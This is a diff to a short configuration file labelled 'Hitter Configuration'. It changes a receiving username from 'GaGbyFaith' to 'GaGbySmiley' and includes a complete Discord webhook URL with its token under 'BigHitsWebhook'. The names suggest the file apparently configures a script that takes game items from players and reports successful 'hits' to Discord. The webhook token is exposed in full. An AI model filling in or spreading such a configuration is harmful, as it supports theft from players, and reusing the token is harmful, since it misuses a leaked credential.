@@ -1,7 +1,7 @@
 -- Hitter Configuration 
 
 Usernames = {
-    'GaGbyFaith',
+    'GaGbySmiley',
 }
 
 BigHitsWebhook = "https://discord.com/api/webhooks/1388384374051049533/qx_eNWIKnDSJ6tfw5_DJT058ZWbvLDv6SjW0VdB2Wfl3BcwxjWgz58I335lCPJossj9P"
